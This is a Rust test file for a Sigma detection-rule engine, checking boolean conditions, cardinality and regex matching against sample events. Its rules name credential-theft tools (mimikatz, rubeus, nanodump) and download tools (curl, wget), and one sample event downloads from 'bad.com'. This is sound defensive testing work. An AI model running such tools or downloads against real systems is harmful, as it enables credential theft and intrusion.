use std::collections::HashMap;
use spectre_rules::{SigmaRule, SigmaEngine};

fn make_rule(yaml_str: &str) -> SigmaRule {
    serde_yaml::from_str(yaml_str).unwrap()
}

#[test]
fn test_simple_and() {
    let yaml = r#"
title: "Test AND"
id: "test-1"
detection:
  sel_a:
    Image|endswith: "sh"
  sel_b:
    CommandLine|contains: "-c"
  condition: "sel_a and sel_b"
"#;
    let rule = make_rule(yaml);
    let engine = SigmaEngine::parse(&rule).unwrap();

    let mut match_event = HashMap::new();
    match_event.insert("Image".to_string(), "/bin/sh".to_string());
    match_event.insert("CommandLine".to_string(), "sh -c whoami".to_string());
    assert!(engine.evaluate(&match_event));

    let mut fail_event = HashMap::new();
    fail_event.insert("Image".to_string(), "/bin/python3".to_string());
    fail_event.insert("CommandLine".to_string(), "python3 -c whoami".to_string());
    assert!(!engine.evaluate(&fail_event));
}

#[test]
fn test_nested_parens_and_not() {
    let yaml = r#"
title: "Test Complex Nested"
id: "test-2"
detection:
  sel_a:
    CommandLine|contains: "curl"
  sel_b:
    CommandLine|contains: "wget"
  filter_safe:
    User: "authorized_admin"
  condition: "(sel_a or sel_b) and not filter_safe"
"#;
    let rule = make_rule(yaml);
    let engine = SigmaEngine::parse(&rule).unwrap();

    let mut attack_event = HashMap::new();
    attack_event.insert("CommandLine".to_string(), "curl -O http://bad.com".to_string());
    attack_event.insert("User".to_string(), "www-data".to_string());
    assert!(engine.evaluate(&attack_event));

    let mut admin_event = HashMap::new();
    admin_event.insert("CommandLine".to_string(), "curl -O http://safe.internal".to_string());
    admin_event.insert("User".to_string(), "authorized_admin".to_string());
    assert!(!engine.evaluate(&admin_event)); // Blocked by NOT filter_safe
}

#[test]
fn test_cardinality_1_of_them() {
    let yaml = r#"
title: "Test Cardinality 1 of them"
id: "test-3"
detection:
  s1:
    CommandLine|contains: "mimikatz"
  s2:
    CommandLine|contains: "rubeus"
  s3:
    CommandLine|contains: "nanodump"
  condition: "1 of them"
"#;
    let rule = make_rule(yaml);
    let engine = SigmaEngine::parse(&rule).unwrap();

    let mut evt = HashMap::new();
    evt.insert("CommandLine".to_string(), "invoke-mimikatz".to_string());
    assert!(engine.evaluate(&evt));

    let mut clean_evt = HashMap::new();
    clean_evt.insert("CommandLine".to_string(), "ls -la".to_string());
    assert!(!engine.evaluate(&clean_evt));
}

#[test]
fn test_regex_compiled_modifier() {
    let yaml = r#"
title: "Test Regex"
id: "test-4"
detection:
  pattern:
    CommandLine|re: "^/tmp/[a-zA-Z0-9]{8}$"
  condition: "pattern"
"#;
    let rule = make_rule(yaml);
    let engine = SigmaEngine::parse(&rule).unwrap();

    let mut match_evt = HashMap::new();
    match_evt.insert("CommandLine".to_string(), "/tmp/aB34dEf8".to_string());
    assert!(engine.evaluate(&match_evt));

    let mut fail_evt = HashMap::new();
    fail_evt.insert("CommandLine".to_string(), "/tmp/too_long_for_regex".to_string());
    assert!(!engine.evaluate(&fail_evt));
}
